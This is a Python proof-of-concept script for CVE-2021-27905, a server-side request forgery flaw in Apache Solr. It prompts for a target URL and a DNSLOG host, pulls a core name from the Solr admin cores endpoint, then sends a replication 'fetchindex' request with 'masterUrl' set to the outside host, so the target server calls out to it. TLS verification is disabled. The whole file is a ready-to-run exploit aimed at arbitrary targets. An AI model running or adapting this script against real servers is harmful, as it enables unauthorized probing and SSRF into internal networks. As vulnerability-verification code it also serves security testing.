#coding: utf-8
# CVE-2021-27905
import requests
import sys
import json
import urllib3
urllib3.disable_warnings()

G = '\033[32m'#绿
Y = '\033[33m'#黄
B = '\033[34m'#蓝
R = '\033[35m'#红
E = '\033[0m'#结束

headers={
		'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36'
	}

def title():
    print(G,'<<<<<   Apache Solr SSRF POC Code By lsadaharu  >>>>>',E)
    print(G,'<<<<<  Useful->python3 poc.py http/https://xxx  >>>>>',E)

def Get_Target():
	target=str(input(G+"Please input Test Target:"+E))
	dnslog=str(input(G+"Please Input DNSLOG:"+E))
	if target.startswith(('https','http')):
		return target,dnslog
	else:
		print(R+"[-] Please Input Correct URL >>>(http://xxx|https://xxx)"+E)

def Get_Core(target):
	payload_core = f"{target}/solr/admin/cores?indexInfo=false&wt=json"
	try:
		response = requests.get(payload_core,headers=headers,verify=False,timeout=3)
		core_name = list(json.loads(response.text)["status"])[0]
		return core_name
	except Exception:
		print(R+"[-] Get Core Failure Or Please Check Your Url,Be careful there is no / after xx >>> https|http://xx ")
		sys.exit()

def Verify_Vul(target,core_name,dnslog):
	verify_payload = f"{target}/solr/{core_name}/replication/?command=fetchindex&masterUrl=http://{dnslog}"
	try:
		response = requests.get(verify_payload,headers=headers,verify=False,timeout=3)
		if "OK" in response.text:
			print(Y+f"{target} May Be Vulnerable,Please Check {dnslog}"+E)
	except Exception:
		print(B+f"[*] {target} No Vuln"+E)

if __name__ == '__main__':
	title()
	target,dnslog=Get_Target()
	core_name=Get_Core(target)
	Verify_Vul(target,core_name,dnslog)
	
	